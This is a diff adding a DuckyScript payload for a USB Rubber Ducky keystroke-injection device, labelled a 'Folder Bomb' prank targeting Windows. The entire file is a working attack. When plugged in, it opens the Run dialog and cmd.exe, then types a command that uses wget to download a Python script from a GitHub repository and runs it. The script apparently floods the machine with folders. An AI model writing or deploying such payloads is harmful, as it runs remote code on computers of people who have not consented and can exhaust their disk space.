@@ -1,0 +1,15 @@
+REM Title: Folder Bomb Win style
+REM Author: FalsePhilosopher
+REM Target:  Win(untested, who cares about win :puke: )
+REM Props: Hak5, PauloVicente89 for the py script and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches cmd, wgets the py script and runs it.
+REM
+DELAY 300
+GUI r
+DELAY 500
+STRING cmd.exe
+DELAY 200
+ENTER
+STRING wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Win/Folder_Bomb/PLWIN.py && python PLWIN.py
